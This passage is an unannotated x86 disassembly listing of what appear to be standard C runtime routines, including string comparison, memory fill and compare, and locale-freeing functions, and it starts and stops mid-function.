  42788e:	mov    DWORD PTR [ebp-0x30],ebx
  427891:	or     DWORD PTR [ebp-0x4],0xffffffff
  427895:	mov    edi,DWORD PTR [ebp-0x1c]
  427898:	mov    esi,DWORD PTR [ebp-0x28]
  42789b:	cmp    DWORD PTR [ebp-0x30],ebx
  42789e:	jne    0x4278b8
  4278a0:	lea    eax,[edi+edi*1]
  4278a3:	push   eax
  4278a4:	call   0x426072
  4278a9:	pop    ecx
  4278aa:	mov    DWORD PTR [ebp-0x30],eax
  4278ad:	cmp    eax,ebx
  4278af:	je     0x4278f1
  4278b1:	mov    DWORD PTR [ebp-0x24],0x1
  4278b8:	push   edi
  4278b9:	push   DWORD PTR [ebp-0x30]
  4278bc:	push   esi
  4278bd:	push   DWORD PTR [ebp-0x2c]
  4278c0:	push   DWORD PTR [ebp+0xc]
  4278c3:	push   DWORD PTR [ebp+0x8]
  4278c6:	call   DWORD PTR ds:0x4290f4
  4278cc:	test   eax,eax
  4278ce:	je     0x4278f1
  4278d0:	push   ebx
  4278d1:	push   ebx
  4278d2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4278d5:	jne    0x4278db
  4278d7:	push   ebx
  4278d8:	push   ebx
  4278d9:	jmp    0x4278e1
  4278db:	push   DWORD PTR [ebp+0x1c]
  4278de:	push   DWORD PTR [ebp+0x18]
  4278e1:	push   edi
  4278e2:	push   DWORD PTR [ebp-0x30]
  4278e5:	push   ebx
  4278e6:	push   DWORD PTR [ebp+0x20]
  4278e9:	call   DWORD PTR ds:0x429080
  4278ef:	mov    edi,eax
  4278f1:	cmp    DWORD PTR [ebp-0x24],ebx
  4278f4:	je     0x4278ff
  4278f6:	push   DWORD PTR [ebp-0x30]
  4278f9:	call   0x425f5a
  4278fe:	pop    ecx
  4278ff:	cmp    DWORD PTR [ebp-0x20],ebx
  427902:	je     0x42790d
  427904:	push   DWORD PTR [ebp-0x2c]
  427907:	call   0x425f5a
  42790c:	pop    ecx
  42790d:	mov    eax,edi
  42790f:	jmp    0x427a6f
  427914:	mov    DWORD PTR [ebp-0x34],ebx
  427917:	xor    edi,edi
  427919:	mov    DWORD PTR [ebp-0x38],ebx
  42791c:	cmp    DWORD PTR [ebp+0x8],ebx
  42791f:	jne    0x427929
  427921:	mov    eax,ds:0x45dda4
  427926:	mov    DWORD PTR [ebp+0x8],eax
  427929:	cmp    DWORD PTR [ebp+0x20],ebx
  42792c:	jne    0x427936
  42792e:	mov    eax,ds:0x45ddb4
  427933:	mov    DWORD PTR [ebp+0x20],eax
  427936:	push   DWORD PTR [ebp+0x8]
  427939:	call   0x4285cd
  42793e:	pop    ecx
  42793f:	mov    DWORD PTR [ebp-0x3c],eax
  427942:	cmp    eax,0xffffffff
  427945:	jne    0x42794e
  427947:	xor    eax,eax
  427949:	jmp    0x427a6f
  42794e:	cmp    eax,DWORD PTR [ebp+0x20]
  427951:	je     0x427a45
  427957:	push   ebx
  427958:	push   ebx
  427959:	lea    ecx,[ebp+0x14]
  42795c:	push   ecx
  42795d:	push   DWORD PTR [ebp+0x10]
  427960:	push   eax
  427961:	push   DWORD PTR [ebp+0x20]
  427964:	call   0x428616
  427969:	add    esp,0x18
  42796c:	mov    DWORD PTR [ebp-0x34],eax
  42796f:	cmp    eax,ebx
  427971:	je     0x427947
  427973:	push   ebx
  427974:	push   ebx
  427975:	push   DWORD PTR [ebp+0x14]
  427978:	push   eax
  427979:	push   DWORD PTR [ebp+0xc]
  42797c:	push   DWORD PTR [ebp+0x8]
  42797f:	call   DWORD PTR ds:0x4290ec
  427985:	mov    esi,eax
  427987:	mov    DWORD PTR [ebp-0x40],esi
  42798a:	cmp    esi,ebx
  42798c:	je     0x427a34
  427992:	mov    DWORD PTR [ebp-0x4],ebx
  427995:	add    eax,0x3
  427998:	and    eax,0xfffffffc
  42799b:	call   0x4253a0
  4279a0:	mov    DWORD PTR [ebp-0x18],esp
  4279a3:	mov    edi,esp
  4279a5:	mov    DWORD PTR [ebp-0x44],edi
  4279a8:	push   esi
  4279a9:	push   ebx
  4279aa:	push   edi
  4279ab:	call   0x427c50
  4279b0:	add    esp,0xc
  4279b3:	jmp    0x4279c5
  4279b5:	xor    eax,eax
  4279b7:	inc    eax
  4279b8:	ret    
  4279b9:	mov    esp,DWORD PTR [ebp-0x18]
  4279bc:	call   0x4287e5
  4279c1:	xor    ebx,ebx
  4279c3:	xor    edi,edi
  4279c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4279c9:	cmp    edi,ebx
  4279cb:	jne    0x4279f0
  4279cd:	push   DWORD PTR [ebp-0x40]
  4279d0:	call   0x426072
  4279d5:	pop    ecx
  4279d6:	mov    edi,eax
  4279d8:	cmp    edi,ebx
  4279da:	je     0x427a0d
  4279dc:	push   DWORD PTR [ebp-0x40]
  4279df:	push   ebx
  4279e0:	push   edi
  4279e1:	call   0x427c50
  4279e6:	add    esp,0xc
  4279e9:	mov    DWORD PTR [ebp-0x38],0x1
  4279f0:	push   DWORD PTR [ebp-0x40]
  4279f3:	push   edi
  4279f4:	push   DWORD PTR [ebp+0x14]
  4279f7:	push   DWORD PTR [ebp-0x34]
  4279fa:	push   DWORD PTR [ebp+0xc]
  4279fd:	push   DWORD PTR [ebp+0x8]
  427a00:	call   DWORD PTR ds:0x4290ec
  427a06:	mov    DWORD PTR [ebp-0x40],eax
  427a09:	cmp    eax,ebx
  427a0b:	jne    0x427a11
  427a0d:	xor    esi,esi
  427a0f:	jmp    0x427a37
  427a11:	push   DWORD PTR [ebp+0x1c]
  427a14:	push   DWORD PTR [ebp+0x18]
  427a17:	lea    eax,[ebp-0x40]
  427a1a:	push   eax
  427a1b:	push   edi
  427a1c:	push   DWORD PTR [ebp+0x20]
  427a1f:	push   DWORD PTR [ebp-0x3c]
  427a22:	call   0x428616
  427a27:	add    esp,0x18
  427a2a:	mov    esi,eax
  427a2c:	neg    esi
  427a2e:	sbb    esi,esi
  427a30:	neg    esi
  427a32:	jmp    0x427a37
  427a34:	mov    esi,DWORD PTR [ebp-0x48]
  427a37:	cmp    DWORD PTR [ebp-0x38],ebx
  427a3a:	je     0x427a5f
  427a3c:	push   edi
  427a3d:	call   0x425f5a
  427a42:	pop    ecx
  427a43:	jmp    0x427a5f
  427a45:	push   DWORD PTR [ebp+0x1c]
  427a48:	push   DWORD PTR [ebp+0x18]
  427a4b:	push   DWORD PTR [ebp+0x14]
  427a4e:	push   DWORD PTR [ebp+0x10]
  427a51:	push   DWORD PTR [ebp+0xc]
  427a54:	push   DWORD PTR [ebp+0x8]
  427a57:	call   DWORD PTR ds:0x4290ec
  427a5d:	mov    esi,eax
  427a5f:	cmp    DWORD PTR [ebp-0x34],ebx
  427a62:	je     0x427a6d
  427a64:	push   DWORD PTR [ebp-0x34]
  427a67:	call   0x425f5a
  427a6c:	pop    ecx
  427a6d:	mov    eax,esi
  427a6f:	lea    esp,[ebp-0x54]
  427a72:	call   0x42538b
  427a77:	ret    
  427a78:	push   0x1c
  427a7a:	push   0x429e88
  427a7f:	call   0x425350
  427a84:	xor    esi,esi
  427a86:	cmp    DWORD PTR ds:0x45ddc0,esi
  427a8c:	jne    0x427ac3
  427a8e:	lea    eax,[ebp-0x1c]
  427a91:	push   eax
  427a92:	xor    edi,edi
  427a94:	inc    edi
  427a95:	push   edi
  427a96:	push   0x429e5c
  427a9b:	push   edi
  427a9c:	call   DWORD PTR ds:0x4290fc
  427aa2:	test   eax,eax
  427aa4:	je     0x427aae
  427aa6:	mov    DWORD PTR ds:0x45ddc0,edi
  427aac:	jmp    0x427ac3
  427aae:	call   DWORD PTR ds:0x429028
  427ab4:	cmp    eax,0x78
  427ab7:	jne    0x427ac3
  427ab9:	mov    DWORD PTR ds:0x45ddc0,0x2
  427ac3:	mov    eax,ds:0x45ddc0
  427ac8:	cmp    eax,0x2
  427acb:	je     0x427bbb
  427ad1:	cmp    eax,esi
  427ad3:	je     0x427bbb
  427ad9:	cmp    eax,0x1
  427adc:	jne    0x427be1
  427ae2:	mov    DWORD PTR [ebp-0x20],esi
  427ae5:	mov    DWORD PTR [ebp-0x24],esi
  427ae8:	cmp    DWORD PTR [ebp+0x18],esi
  427aeb:	jne    0x427af5
  427aed:	mov    eax,ds:0x45ddb4
  427af2:	mov    DWORD PTR [ebp+0x18],eax
  427af5:	push   esi
  427af6:	push   esi
  427af7:	push   DWORD PTR [ebp+0x10]
  427afa:	push   DWORD PTR [ebp+0xc]
  427afd:	xor    eax,eax
  427aff:	cmp    DWORD PTR [ebp+0x20],esi
  427b02:	setne  al
  427b05:	lea    eax,[eax*8+0x1]
  427b0c:	push   eax
  427b0d:	push   DWORD PTR [ebp+0x18]
  427b10:	call   DWORD PTR ds:0x4290f0
  427b16:	mov    edi,eax
  427b18:	mov    DWORD PTR [ebp-0x28],edi
  427b1b:	test   edi,edi
  427b1d:	je     0x427be1
  427b23:	and    DWORD PTR [ebp-0x4],0x0
  427b27:	lea    ebx,[edi+edi*1]
  427b2a:	mov    eax,ebx
  427b2c:	add    eax,0x3
  427b2f:	and    eax,0xfffffffc
  427b32:	call   0x4253a0
  427b37:	mov    DWORD PTR [ebp-0x18],esp
  427b3a:	mov    esi,esp
  427b3c:	mov    DWORD PTR [ebp-0x2c],esi
  427b3f:	push   ebx
  427b40:	push   0x0
  427b42:	push   esi
  427b43:	call   0x427c50
  427b48:	add    esp,0xc
  427b4b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b4f:	jmp    0x427b66
  427b51:	xor    eax,eax
  427b53:	inc    eax
  427b54:	ret    
  427b55:	mov    esp,DWORD PTR [ebp-0x18]
  427b58:	call   0x4287e5
  427b5d:	xor    esi,esi
  427b5f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b63:	mov    edi,DWORD PTR [ebp-0x28]
  427b66:	test   esi,esi
  427b68:	jne    0x427b81
  427b6a:	push   edi
  427b6b:	push   0x2
  427b6d:	call   0x426468
  427b72:	pop    ecx
  427b73:	pop    ecx
  427b74:	mov    esi,eax
  427b76:	test   esi,esi
  427b78:	je     0x427be1
  427b7a:	mov    DWORD PTR [ebp-0x24],0x1
  427b81:	push   edi
  427b82:	push   esi
  427b83:	push   DWORD PTR [ebp+0x10]
  427b86:	push   DWORD PTR [ebp+0xc]
  427b89:	push   0x1
  427b8b:	push   DWORD PTR [ebp+0x18]
  427b8e:	call   DWORD PTR ds:0x4290f0
  427b94:	test   eax,eax
  427b96:	je     0x427ba9
  427b98:	push   DWORD PTR [ebp+0x14]
  427b9b:	push   eax
  427b9c:	push   esi
  427b9d:	push   DWORD PTR [ebp+0x8]
  427ba0:	call   DWORD PTR ds:0x4290fc
  427ba6:	mov    DWORD PTR [ebp-0x20],eax
  427ba9:	cmp    DWORD PTR [ebp-0x24],0x0
  427bad:	je     0x427bb6
  427baf:	push   esi
  427bb0:	call   0x425f5a
  427bb5:	pop    ecx
  427bb6:	mov    eax,DWORD PTR [ebp-0x20]
  427bb9:	jmp    0x427c29
  427bbb:	mov    ebx,DWORD PTR [ebp+0x1c]
  427bbe:	cmp    ebx,esi
  427bc0:	jne    0x427bc8
  427bc2:	mov    ebx,DWORD PTR ds:0x45dda4
  427bc8:	mov    edi,DWORD PTR [ebp+0x18]
  427bcb:	test   edi,edi
  427bcd:	jne    0x427bd5
  427bcf:	mov    edi,DWORD PTR ds:0x45ddb4
  427bd5:	push   ebx
  427bd6:	call   0x4285cd
  427bdb:	pop    ecx
  427bdc:	cmp    eax,0xffffffff
  427bdf:	jne    0x427be5
  427be1:	xor    eax,eax
  427be3:	jmp    0x427c29
  427be5:	cmp    eax,edi
  427be7:	je     0x427c07
  427be9:	push   0x0
  427beb:	push   0x0
  427bed:	lea    ecx,[ebp+0x10]
  427bf0:	push   ecx
  427bf1:	push   DWORD PTR [ebp+0xc]
  427bf4:	push   eax
  427bf5:	push   edi
  427bf6:	call   0x428616
  427bfb:	add    esp,0x18
  427bfe:	mov    esi,eax
  427c00:	test   esi,esi
  427c02:	je     0x427be1
  427c04:	mov    DWORD PTR [ebp+0xc],esi
  427c07:	push   DWORD PTR [ebp+0x14]
  427c0a:	push   DWORD PTR [ebp+0x10]
  427c0d:	push   DWORD PTR [ebp+0xc]
  427c10:	push   DWORD PTR [ebp+0x8]
  427c13:	push   ebx
  427c14:	call   DWORD PTR ds:0x4290f8
  427c1a:	mov    edi,eax
  427c1c:	test   esi,esi
  427c1e:	je     0x427c27
  427c20:	push   esi
  427c21:	call   0x425f5a
  427c26:	pop    ecx
  427c27:	mov    eax,edi
  427c29:	lea    esp,[ebp-0x38]
  427c2c:	call   0x42538b
  427c31:	ret    
  427c32:	mov    eax,ds:0x45ddc4
  427c37:	test   eax,eax
  427c39:	je     0x427c4a
  427c3b:	push   DWORD PTR [esp+0x4]
  427c3f:	call   eax
  427c41:	test   eax,eax
  427c43:	pop    ecx
  427c44:	je     0x427c4a
  427c46:	xor    eax,eax
  427c48:	inc    eax
  427c49:	ret    
  427c4a:	xor    eax,eax
  427c4c:	ret    
  427c4d:	int3   
  427c4e:	int3   
  427c4f:	int3   
  427c50:	mov    edx,DWORD PTR [esp+0xc]
  427c54:	mov    ecx,DWORD PTR [esp+0x4]
  427c58:	test   edx,edx
  427c5a:	je     0x427cab
  427c5c:	xor    eax,eax
  427c5e:	mov    al,BYTE PTR [esp+0x8]
  427c62:	push   edi
  427c63:	mov    edi,ecx
  427c65:	cmp    edx,0x4
  427c68:	jb     0x427c9b
  427c6a:	neg    ecx
  427c6c:	and    ecx,0x3
  427c6f:	je     0x427c7d
  427c71:	sub    edx,ecx
  427c73:	mov    BYTE PTR [edi],al
  427c75:	add    edi,0x1
  427c78:	sub    ecx,0x1
  427c7b:	jne    0x427c73
  427c7d:	mov    ecx,eax
  427c7f:	shl    eax,0x8
  427c82:	add    eax,ecx
  427c84:	mov    ecx,eax
  427c86:	shl    eax,0x10
  427c89:	add    eax,ecx
  427c8b:	mov    ecx,edx
  427c8d:	and    edx,0x3
  427c90:	shr    ecx,0x2
  427c93:	je     0x427c9b
  427c95:	rep stos DWORD PTR es:[edi],eax
  427c97:	test   edx,edx
  427c99:	je     0x427ca5
  427c9b:	mov    BYTE PTR [edi],al
  427c9d:	add    edi,0x1
  427ca0:	sub    edx,0x1
  427ca3:	jne    0x427c9b
  427ca5:	mov    eax,DWORD PTR [esp+0x8]
  427ca9:	pop    edi
  427caa:	ret    
  427cab:	mov    eax,DWORD PTR [esp+0x4]
  427caf:	ret    
  427cb0:	push   esi
  427cb1:	mov    esi,DWORD PTR [esp+0x8]
  427cb5:	test   esi,esi
  427cb7:	je     0x427e3e
  427cbd:	push   DWORD PTR [esi+0x4]
  427cc0:	call   0x425f5a
  427cc5:	push   DWORD PTR [esi+0x8]
  427cc8:	call   0x425f5a
  427ccd:	push   DWORD PTR [esi+0xc]
  427cd0:	call   0x425f5a
  427cd5:	push   DWORD PTR [esi+0x10]
  427cd8:	call   0x425f5a
  427cdd:	push   DWORD PTR [esi+0x14]
  427ce0:	call   0x425f5a
  427ce5:	push   DWORD PTR [esi+0x18]
  427ce8:	call   0x425f5a
  427ced:	push   DWORD PTR [esi]
  427cef:	call   0x425f5a
  427cf4:	push   DWORD PTR [esi+0x20]
  427cf7:	call   0x425f5a
  427cfc:	push   DWORD PTR [esi+0x24]
  427cff:	call   0x425f5a
  427d04:	push   DWORD PTR [esi+0x28]
  427d07:	call   0x425f5a
  427d0c:	push   DWORD PTR [esi+0x2c]
  427d0f:	call   0x425f5a
  427d14:	push   DWORD PTR [esi+0x30]
  427d17:	call   0x425f5a
  427d1c:	push   DWORD PTR [esi+0x34]
  427d1f:	call   0x425f5a
  427d24:	push   DWORD PTR [esi+0x1c]
  427d27:	call   0x425f5a
  427d2c:	push   DWORD PTR [esi+0x38]
  427d2f:	call   0x425f5a
  427d34:	push   DWORD PTR [esi+0x3c]
  427d37:	call   0x425f5a
  427d3c:	add    esp,0x40
  427d3f:	push   DWORD PTR [esi+0x40]
  427d42:	call   0x425f5a
  427d47:	push   DWORD PTR [esi+0x44]
  427d4a:	call   0x425f5a
  427d4f:	push   DWORD PTR [esi+0x48]
  427d52:	call   0x425f5a
  427d57:	push   DWORD PTR [esi+0x4c]
  427d5a:	call   0x425f5a
  427d5f:	push   DWORD PTR [esi+0x50]
  427d62:	call   0x425f5a
  427d67:	push   DWORD PTR [esi+0x54]
  427d6a:	call   0x425f5a
  427d6f:	push   DWORD PTR [esi+0x58]
  427d72:	call   0x425f5a
  427d77:	push   DWORD PTR [esi+0x5c]
  427d7a:	call   0x425f5a
  427d7f:	push   DWORD PTR [esi+0x60]
  427d82:	call   0x425f5a
  427d87:	push   DWORD PTR [esi+0x64]
  427d8a:	call   0x425f5a
  427d8f:	push   DWORD PTR [esi+0x68]
  427d92:	call   0x425f5a
  427d97:	push   DWORD PTR [esi+0x6c]
  427d9a:	call   0x425f5a
  427d9f:	push   DWORD PTR [esi+0x70]
  427da2:	call   0x425f5a
  427da7:	push   DWORD PTR [esi+0x74]
  427daa:	call   0x425f5a
  427daf:	push   DWORD PTR [esi+0x78]
  427db2:	call   0x425f5a
  427db7:	push   DWORD PTR [esi+0x7c]
  427dba:	call   0x425f5a
  427dbf:	add    esp,0x40
  427dc2:	push   DWORD PTR [esi+0x80]
  427dc8:	call   0x425f5a
  427dcd:	push   DWORD PTR [esi+0x84]
  427dd3:	call   0x425f5a
  427dd8:	push   DWORD PTR [esi+0x88]
  427dde:	call   0x425f5a
  427de3:	push   DWORD PTR [esi+0x8c]
  427de9:	call   0x425f5a
  427dee:	push   DWORD PTR [esi+0x90]
  427df4:	call   0x425f5a
  427df9:	push   DWORD PTR [esi+0x94]
  427dff:	call   0x425f5a
  427e04:	push   DWORD PTR [esi+0x98]
  427e0a:	call   0x425f5a
  427e0f:	push   DWORD PTR [esi+0x9c]
  427e15:	call   0x425f5a
  427e1a:	push   DWORD PTR [esi+0xa0]
  427e20:	call   0x425f5a
  427e25:	push   DWORD PTR [esi+0xa4]
  427e2b:	call   0x425f5a
  427e30:	push   DWORD PTR [esi+0xa8]
  427e36:	call   0x425f5a
  427e3b:	add    esp,0x2c
  427e3e:	pop    esi
  427e3f:	ret    
  427e40:	push   esi
  427e41:	mov    esi,DWORD PTR [esp+0x8]
  427e45:	test   esi,esi
  427e47:	je     0x427e9d
  427e49:	mov    eax,DWORD PTR [esi]
  427e4b:	mov    ecx,DWORD PTR ds:0x45d934
  427e51:	cmp    eax,DWORD PTR [ecx]
  427e53:	je     0x427e64
  427e55:	cmp    eax,DWORD PTR ds:0x45d904
  427e5b:	je     0x427e64
  427e5d:	push   eax
  427e5e:	call   0x425f5a
  427e63:	pop    ecx
  427e64:	mov    eax,DWORD PTR [esi+0x4]
  427e67:	mov    ecx,DWORD PTR ds:0x45d934
  427e6d:	cmp    eax,DWORD PTR [ecx+0x4]
  427e70:	je     0x427e81
  427e72:	cmp    eax,DWORD PTR ds:0x45d908
  427e78:	je     0x427e81
  427e7a:	push   eax
  427e7b:	call   0x425f5a
  427e80:	pop    ecx
  427e81:	mov    esi,DWORD PTR [esi+0x8]
  427e84:	mov    eax,ds:0x45d934
  427e89:	cmp    esi,DWORD PTR [eax+0x8]
  427e8c:	je     0x427e9d
  427e8e:	cmp    esi,DWORD PTR ds:0x45d90c
  427e94:	je     0x427e9d
  427e96:	push   esi
  427e97:	call   0x425f5a
  427e9c:	pop    ecx
  427e9d:	pop    esi
  427e9e:	ret    
  427e9f:	push   esi
  427ea0:	mov    esi,DWORD PTR [esp+0x8]
  427ea4:	test   esi,esi
  427ea6:	je     0x427f76
  427eac:	mov    eax,DWORD PTR [esi+0xc]
  427eaf:	mov    ecx,DWORD PTR ds:0x45d934
  427eb5:	cmp    eax,DWORD PTR [ecx+0xc]
  427eb8:	je     0x427ec9
  427eba:	cmp    eax,DWORD PTR ds:0x45d910
  427ec0:	je     0x427ec9
  427ec2:	push   eax
  427ec3:	call   0x425f5a
  427ec8:	pop    ecx
  427ec9:	mov    eax,DWORD PTR [esi+0x10]
  427ecc:	mov    ecx,DWORD PTR ds:0x45d934
  427ed2:	cmp    eax,DWORD PTR [ecx+0x10]
  427ed5:	je     0x427ee6
  427ed7:	cmp    eax,DWORD PTR ds:0x45d914
  427edd:	je     0x427ee6
  427edf:	push   eax
  427ee0:	call   0x425f5a
  427ee5:	pop    ecx
  427ee6:	mov    eax,DWORD PTR [esi+0x14]
  427ee9:	mov    ecx,DWORD PTR ds:0x45d934
  427eef:	cmp    eax,DWORD PTR [ecx+0x14]
  427ef2:	je     0x427f03
  427ef4:	cmp    eax,DWORD PTR ds:0x45d918
  427efa:	je     0x427f03
  427efc:	push   eax
  427efd:	call   0x425f5a
  427f02:	pop    ecx
  427f03:	mov    eax,DWORD PTR [esi+0x18]
  427f06:	mov    ecx,DWORD PTR ds:0x45d934
  427f0c:	cmp    eax,DWORD PTR [ecx+0x18]
  427f0f:	je     0x427f20
  427f11:	cmp    eax,DWORD PTR ds:0x45d91c
  427f17:	je     0x427f20
  427f19:	push   eax
  427f1a:	call   0x425f5a
  427f1f:	pop    ecx
  427f20:	mov    eax,DWORD PTR [esi+0x1c]
  427f23:	mov    ecx,DWORD PTR ds:0x45d934
  427f29:	cmp    eax,DWORD PTR [ecx+0x1c]
  427f2c:	je     0x427f3d
  427f2e:	cmp    eax,DWORD PTR ds:0x45d920
  427f34:	je     0x427f3d
  427f36:	push   eax
  427f37:	call   0x425f5a
  427f3c:	pop    ecx
  427f3d:	mov    eax,DWORD PTR [esi+0x20]
  427f40:	mov    ecx,DWORD PTR ds:0x45d934
  427f46:	cmp    eax,DWORD PTR [ecx+0x20]
  427f49:	je     0x427f5a
  427f4b:	cmp    eax,DWORD PTR ds:0x45d924
  427f51:	je     0x427f5a
  427f53:	push   eax
  427f54:	call   0x425f5a
  427f59:	pop    ecx
  427f5a:	mov    esi,DWORD PTR [esi+0x24]
  427f5d:	mov    eax,ds:0x45d934
  427f62:	cmp    esi,DWORD PTR [eax+0x24]
  427f65:	je     0x427f76
  427f67:	cmp    esi,DWORD PTR ds:0x45d928
  427f6d:	je     0x427f76
  427f6f:	push   esi
  427f70:	call   0x425f5a
  427f75:	pop    ecx
  427f76:	pop    esi
  427f77:	ret    
  427f78:	int3   
  427f79:	int3   
  427f7a:	int3   
  427f7b:	int3   
  427f7c:	int3   
  427f7d:	int3   
  427f7e:	int3   
  427f7f:	int3   
  427f80:	push   ebp
  427f81:	mov    ebp,esp
  427f83:	push   esi
  427f84:	xor    eax,eax
  427f86:	push   eax
  427f87:	push   eax
  427f88:	push   eax
  427f89:	push   eax
  427f8a:	push   eax
  427f8b:	push   eax
  427f8c:	push   eax
  427f8d:	push   eax
  427f8e:	mov    edx,DWORD PTR [ebp+0xc]
  427f91:	lea    ecx,[ecx+0x0]
  427f94:	mov    al,BYTE PTR [edx]
  427f96:	or     al,al
  427f98:	je     0x427fa3
  427f9a:	add    edx,0x1
  427f9d:	bts    DWORD PTR [esp],eax
  427fa1:	jmp    0x427f94
  427fa3:	mov    esi,DWORD PTR [ebp+0x8]
  427fa6:	or     ecx,0xffffffff
  427fa9:	lea    ecx,[ecx+0x0]
  427fac:	add    ecx,0x1
  427faf:	mov    al,BYTE PTR [esi]
  427fb1:	or     al,al
  427fb3:	je     0x427fbe
  427fb5:	add    esi,0x1
  427fb8:	bt     DWORD PTR [esp],eax
  427fbc:	jae    0x427fac
  427fbe:	mov    eax,ecx
  427fc0:	add    esp,0x20
  427fc3:	pop    esi
  427fc4:	leave  
  427fc5:	ret    
  427fc6:	int3   
  427fc7:	int3   
  427fc8:	int3   
  427fc9:	int3   
  427fca:	int3   
  427fcb:	int3   
  427fcc:	int3   
  427fcd:	int3   
  427fce:	int3   
  427fcf:	int3   
  427fd0:	mov    edx,DWORD PTR [esp+0x4]
  427fd4:	mov    ecx,DWORD PTR [esp+0x8]
  427fd8:	test   edx,0x3
  427fde:	jne    0x42801c
  427fe0:	mov    eax,DWORD PTR [edx]
  427fe2:	cmp    al,BYTE PTR [ecx]
  427fe4:	jne    0x428014
  427fe6:	or     al,al
  427fe8:	je     0x428010
  427fea:	cmp    ah,BYTE PTR [ecx+0x1]
  427fed:	jne    0x428014
  427fef:	or     ah,ah
  427ff1:	je     0x428010
  427ff3:	shr    eax,0x10
  427ff6:	cmp    al,BYTE PTR [ecx+0x2]
  427ff9:	jne    0x428014
  427ffb:	or     al,al
  427ffd:	je     0x428010
  427fff:	cmp    ah,BYTE PTR [ecx+0x3]
  428002:	jne    0x428014
  428004:	add    ecx,0x4
  428007:	add    edx,0x4
  42800a:	or     ah,ah
  42800c:	jne    0x427fe0
  42800e:	mov    edi,edi
  428010:	xor    eax,eax
  428012:	ret    
  428013:	nop
  428014:	sbb    eax,eax
  428016:	shl    eax,1
  428018:	add    eax,0x1
  42801b:	ret    
  42801c:	test   edx,0x1
  428022:	je     0x42803c
  428024:	mov    al,BYTE PTR [edx]
  428026:	add    edx,0x1
  428029:	cmp    al,BYTE PTR [ecx]
  42802b:	jne    0x428014
  42802d:	add    ecx,0x1
  428030:	or     al,al
  428032:	je     0x428010
  428034:	test   edx,0x2
  42803a:	je     0x427fe0
  42803c:	mov    ax,WORD PTR [edx]
  42803f:	add    edx,0x2
  428042:	cmp    al,BYTE PTR [ecx]
  428044:	jne    0x428014
  428046:	or     al,al
  428048:	je     0x428010
  42804a:	cmp    ah,BYTE PTR [ecx+0x1]
  42804d:	jne    0x428014
  42804f:	or     ah,ah
  428051:	je     0x428010
  428053:	add    ecx,0x2
  428056:	jmp    0x427fe0
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	mov    eax,DWORD PTR [esp+0xc]
  428064:	test   eax,eax
  428066:	je     0x4280b2
  428068:	mov    edx,DWORD PTR [esp+0x4]
  42806c:	push   esi
  42806d:	push   edi
  42806e:	mov    esi,edx
  428070:	mov    edi,DWORD PTR [esp+0x10]
  428074:	or     edx,edi
  428076:	and    edx,0x3
  428079:	je     0x4280b3
  42807b:	test   eax,0x1
  428080:	je     0x428093
  428082:	mov    cl,BYTE PTR [esi]
  428084:	cmp    cl,BYTE PTR [edi]
  428086:	jne    0x4280e0
  428088:	add    esi,0x1
  42808b:	add    edi,0x1
  42808e:	sub    eax,0x1
  428091:	je     0x4280b0
  428093:	mov    cl,BYTE PTR [esi]
  428095:	mov    dl,BYTE PTR [edi]
  428097:	cmp    cl,dl
  428099:	jne    0x4280e0
  42809b:	mov    cl,BYTE PTR [esi+0x1]
  42809e:	mov    dl,BYTE PTR [edi+0x1]
  4280a1:	cmp    cl,dl
  4280a3:	jne    0x4280e0
  4280a5:	add    edi,0x2
  4280a8:	add    esi,0x2
  4280ab:	sub    eax,0x2
  4280ae:	jne    0x428093
  4280b0:	pop    edi
  4280b1:	pop    esi
  4280b2:	ret    
  4280b3:	mov    ecx,eax
  4280b5:	and    eax,0x3
  4280b8:	shr    ecx,0x2
  4280bb:	je     0x4280e8
  4280bd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280bf:	je     0x4280e8
  4280c1:	mov    ecx,DWORD PTR [esi-0x4]
  4280c4:	mov    edx,DWORD PTR [edi-0x4]
  4280c7:	cmp    cl,dl
  4280c9:	jne    0x4280db
  4280cb:	cmp    ch,dh
  4280cd:	jne    0x4280db
  4280cf:	shr    ecx,0x10
  4280d2:	shr    edx,0x10
  4280d5:	cmp    cl,dl
  4280d7:	jne    0x4280db
  4280d9:	cmp    ch,dh
  4280db:	mov    eax,0x0
  4280e0:	sbb    eax,eax
  4280e2:	pop    edi
  4280e3:	sbb    eax,0xffffffff
  4280e6:	pop    esi
  4280e7:	ret    
  4280e8:	test   eax,eax
  4280ea:	je     0x4280b0
  4280ec:	mov    edx,DWORD PTR [esi]
  4280ee:	mov    ecx,DWORD PTR [edi]
  4280f0:	cmp    dl,cl
  4280f2:	jne    0x4280db
  4280f4:	sub    eax,0x1
  4280f7:	je     0x428115
  4280f9:	cmp    dh,ch
  4280fb:	jne    0x4280db
  4280fd:	sub    eax,0x1
  428100:	je     0x428115
  428102:	and    ecx,0xff0000
  428108:	and    edx,0xff0000
  42810e:	cmp    edx,ecx
  428110:	jne    0x4280db
  428112:	sub    eax,0x1
  428115:	pop    edi
  428116:	pop    esi
  428117:	ret    
  428118:	int3   
  428119:	int3   
  42811a:	int3   
  42811b:	int3   
  42811c:	int3   
  42811d:	int3   
  42811e:	int3   
  42811f:	int3   
  428120:	push   ebp
  428121:	mov    ebp,esp
  428123:	push   edi
  428124:	push   esi
  428125:	push   ebx
  428126:	mov    ecx,DWORD PTR [ebp+0x10]
  428129:	jecxz  0x428152
  42812b:	mov    ebx,ecx
  42812d:	mov    edi,DWORD PTR [ebp+0x8]
  428130:	mov    esi,edi
  428132:	xor    eax,eax
  428134:	repnz scas al,BYTE PTR es:[edi]
  428136:	neg    ecx
  428138:	add    ecx,ebx
  42813a:	mov    edi,esi
  42813c:	mov    esi,DWORD PTR [ebp+0xc]
  42813f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428141:	mov    al,BYTE PTR [esi-0x1]
  428144:	xor    ecx,ecx
  428146:	cmp    al,BYTE PTR [edi-0x1]
  428149:	ja     0x428150
  42814b:	je     0x428152
  42814d:	sub    ecx,0x2
  428150:	not    ecx
  428152:	mov    eax,ecx
  428154:	pop    ebx
  428155:	pop    esi
  428156:	pop    edi
  428157:	leave  
  428158:	ret    
  428159:	int3   
  42815a:	int3   
  42815b:	int3   
  42815c:	int3   
  42815d:	int3   
  42815e:	int3   
  42815f:	int3   
  428160:	push   ebp
  428161:	mov    ebp,esp
  428163:	push   esi
  428164:	xor    eax,eax
